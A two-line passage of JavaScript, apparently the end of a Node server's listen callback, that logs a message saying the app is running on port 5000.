console.log("App Running on Port 5000!");
});
